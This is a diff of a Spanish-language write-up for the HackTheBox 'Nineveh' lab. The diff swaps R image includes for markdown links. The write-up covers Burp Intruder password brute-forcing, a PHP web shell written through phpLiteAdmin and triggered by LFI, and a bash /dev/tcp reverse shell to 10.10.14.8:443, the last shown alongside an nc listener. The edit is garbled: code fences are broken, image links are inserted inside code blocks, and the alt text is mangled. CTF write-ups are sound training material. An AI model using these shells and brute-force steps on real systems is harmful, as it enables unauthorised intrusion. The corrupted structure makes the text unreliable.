@@ -131,18 +131,14 @@ es exactamente la misma, solo la IP y la url de las imagenes cambian.
 1. En burpsuite le damos al `Ctrl+i` para enviarlo al intruder
 1. Configuramos el attacker **Sniper** dando la posicion a la palabra password
 
-    ```{r, echo = FALSE, fig.cap="nineveh sniper config", out.width="90%"}
-    knitr::include_graphics("images/notebook-sniper-config.png")
-    ```
 
+![otebook-sier-cofi](../assets/images/notebook-sniper-config.png) 
 1. Cargamos el diccionario creado a la payload list y le quitamos el Payload encoding
 
     ```{r, echo = FALSE, fig.cap="nineveh sniper payload list", out.width="90%"}
     knitr::include_graphics("images/notebook-sniper-list.png")
-    ```
 
-1. En Options creamos un regexp para saver cuando la contraseña es valida
-
+![otebook-sier-list](../assets/images/notebook-sniper-list.png) 
     - en Grep - Extract damos a ADD
     - le damos a Fetch response y seleccionamos el campo invalid password
 
@@ -150,10 +146,8 @@ es exactamente la misma, solo la IP y la url de las imagenes cambian.
         knitr::include_graphics("images/notebook-fetch-response.png")
         ```
 
-1. Le damos a start attack
-
-Aqui ya aparece la lista de todo los passwords que burp prueba y vemos una columna donde esta escrito `invalid password`.
 lo dejamos un ratito y ya podemos ver que filtrando por esta columna vemos una linea donde no esta escrito esto. Ya tenemos la contraseña.
+![otebook-fetch-resose](../assets/images/notebook-fetch-response.png) 
 
 ### Bruteforcear la contraseña con python {-}
 
@@ -417,38 +411,30 @@ crear una base de datos con una extension php y insertar PHP code para posterior
 
     Si pinchamos el link de la hack.php database vemos que a sido creado en `/var/tmp/hack.php`
 
-1. Creamos una tabla de una columna que contiene code PHP
-
-    ```{r, echo = FALSE, fig.cap="create table test", out.width="90%"}
     knitr::include_graphics("images/phpliteadmin-create-table.png")
+![hliteadmi-hack-h](../assets/images/phpliteadmin-hack-php.png) 
     ```
 
 1. Entramos un comando PHP en la tabla
 
     ```{r, echo = FALSE, fig.cap="insert php command", out.width="90%"}
     knitr::include_graphics("images/phpliteadmin-insert-command.png")
-    ```
 
-    El comando es `<?php system($_REQUEST["cmd"]); ?>`
-
+![hliteadmi-create-table](../assets/images/phpliteadmin-create-table.png) 
 1. y con el uso de la LFI miramos lo que passa
 
     ```{r, echo = FALSE, fig.cap="phpliteadmin RCE", out.width="90%"}
     knitr::include_graphics("images/phpliteadmin-rce.png")
-    ```
 
-Ahora que tenemos posibilidades de ejecutar comandos de manera remota, vamos a tratar de ganar accesso al sistema.
-
+![hliteadmi-isert-commad](../assets/images/phpliteadmin-insert-command.png) 
 1. Nos ponemos en escucha por el puerto 443
 
     ```bash
     nc -nlvp 443
     ```
 
-1. Creamos un archivo *index.html* que contiene
-
-    ```html
     #!/bin/bash
+![hliteadmi-rce](../assets/images/phpliteadmin-rce.png) 
 
     bash -i >& /dev/tcp/10.10.14.8/443 0>&1
     ```
